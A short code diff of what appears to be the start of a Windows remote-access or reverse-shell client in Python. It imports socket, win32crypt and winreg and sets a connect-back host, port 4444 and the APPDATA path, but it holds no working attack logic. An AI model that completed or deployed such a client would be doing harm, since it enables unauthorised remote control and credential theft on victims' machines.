@@ -10,7 +10,7 @@ End Developing Date:
 
 # Step 1: Import requires libraries
 import socket
-import os
+from os import path, environ
 from sys import argv, exit
 import platform
 from time import sleep
@@ -25,4 +25,36 @@ import win32event
 import win32crypt
 
 from winreg import *
+
+
+
+# Step 2: Define Global Variables
+SERVER_HOST = "192.168.10.100"
+SERVER_PORT = 4444
+
+strPATH = path.realpath(argv[0])
+TMP = environ['APPDATA']
+
+intBuffer = 1024
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
